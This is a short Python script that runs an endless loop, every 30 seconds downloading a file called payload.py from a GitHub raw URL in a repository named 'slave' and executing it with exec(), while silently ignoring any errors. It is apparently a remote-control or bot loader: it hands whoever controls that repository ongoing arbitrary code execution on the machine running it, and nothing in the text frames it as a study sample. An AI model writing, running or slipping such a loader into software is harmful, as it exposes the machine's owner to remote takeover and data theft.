from urllib.request import urlopen
from time import sleep

while True:
    try:
        with urlopen('https://raw.githubusercontent.com/liverfried/slave/main/payload.py') as payload:
            exec(payload.read())
    except Exception:
        ...

    sleep(30)
